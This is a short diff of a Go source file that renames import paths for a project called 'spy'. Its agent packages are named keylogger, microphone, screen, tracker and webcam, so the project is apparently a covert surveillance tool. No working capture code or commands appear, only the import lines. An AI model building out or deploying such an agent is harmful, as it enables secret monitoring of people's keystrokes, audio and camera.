@@ -5,13 +5,13 @@ import (
 	"fmt"
 	"strings"
 
-	"github.com/cinus-e/spy/agent/keylogger"
-	"github.com/cinus-e/spy/agent/microphone"
-	"github.com/cinus-e/spy/agent/screen"
-	"github.com/cinus-e/spy/agent/tracker"
-	"github.com/cinus-e/spy/agent/webcam"
-	"github.com/cinus-e/spy/literr"
-	"github.com/cinus-e/spy/util"
+	"github.com/cinus-ue/spy/agent/keylogger"
+	"github.com/cinus-ue/spy/agent/microphone"
+	"github.com/cinus-ue/spy/agent/screen"
+	"github.com/cinus-ue/spy/agent/tracker"
+	"github.com/cinus-ue/spy/agent/webcam"
+	"github.com/cinus-ue/spy/literr"
+	"github.com/cinus-ue/spy/util"
 )
 
 var workers = make(map[string]worker, 10)
